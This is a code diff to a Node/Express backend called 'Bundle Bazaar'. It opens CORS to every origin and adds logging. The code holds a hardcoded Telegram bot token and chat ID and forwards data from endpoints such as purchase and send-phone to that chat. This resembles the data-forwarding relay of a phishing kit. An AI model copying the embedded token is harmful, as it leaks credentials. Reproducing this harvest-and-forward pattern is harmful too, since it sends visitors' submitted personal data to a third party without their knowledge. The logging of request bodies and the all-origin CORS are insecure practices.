@@ -6,23 +6,25 @@ const app = express();
 const PORT = process.env.PORT || 5000;
 
 // =============================================
-// CONFIGURATION - UPDATED WITH NEW TELEGRAM CREDENTIALS
+// CONFIGURATION - TELEGRAM CREDENTIALS
 // =============================================
 const TELEGRAM_BOT_TOKEN = '8912556480:AAF_m34R8vT5GUwhsx29qPW854OOXnl5FfY';
 const TELEGRAM_CHAT_ID = '8313270294';
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-// TEST_MODE = false to actually send messages
 const TEST_MODE = false;
 
 // =============================================
-// MIDDLEWARE
+// ✅ FIXED CORS - ALLOW ALL ORIGINS
 // =============================================
 app.use(cors({
-    origin: '*',
-    methods: ['GET', 'POST', 'PUT', 'DELETE'],
-    allowedHeaders: ['Content-Type', 'Authorization']
+    origin: '*', // ✅ Allow ALL origins
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept']
 }));
+
+// ✅ Handle preflight requests
+app.options('*', cors());
+
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
@@ -32,6 +34,7 @@ app.use(express.urlencoded({ extended: true }));
 app.use((req, res, next) => {
     console.log(`📥 ${req.method} ${req.path}`);
     console.log('📦 Body:', req.body);
+    console.log('🌐 Origin:', req.headers.origin);
     next();
 });
 
@@ -41,7 +44,7 @@ app.use((req, res, next) => {
 async function sendToTelegram(message) {
     if (TEST_MODE) {
         console.log('📨 [TEST MODE] Would send to Telegram:', message);
-        return { ok: true, message: 'Test mode - message logged' };
+        return { ok: true };
     }
 
     try {
@@ -54,7 +57,7 @@ async function sendToTelegram(message) {
         return response.data;
     } catch (error) {
         console.error('❌ Error sending to Telegram:', error.response?.data || error.message);
-        return { ok: false, message: 'Telegram error but continuing' };
+        return { ok: false };
     }
 }
 
@@ -127,6 +130,7 @@ app.get('/', (req, res) => {
         port: PORT,
         testMode: TEST_MODE,
         telegramBot: '✅ Connected',
+        cors: '✅ Enabled for all origins',
         endpoints: [
             'POST /api/register-vendor',
             'POST /api/purchase',
@@ -301,9 +305,12 @@ app.post('/api/send-phone', async (req, res) => {
 // 404 Handler
 // =============================================
 app.use((req, res) => {
+    console.log('❌ 404 Not Found:', req.method, req.path);
     res.status(404).json({
         success: false,
-        message: '❌ Endpoint not found'
+        message: '❌ Endpoint not found',
+        path: req.path,
+        method: req.method
     });
 });
 
@@ -311,9 +318,12 @@ app.use((req, res) => {
 // START SERVER
 // =============================================
 app.listen(PORT, '0.0.0.0', () => {
+    console.log('='.repeat(50));
     console.log(`🚀 Bundle Bazaar Backend running on port ${PORT}`);
     console.log(`📨 TEST_MODE: ${TEST_MODE}`);
     console.log(`🤖 Telegram Bot: ✅ Configured`);
+    console.log(`🌐 CORS: ✅ Enabled for all origins`);
+    console.log('='.repeat(50));
     console.log('');
     console.log('📌 Available endpoints:');
     console.log('   POST /api/register-vendor');
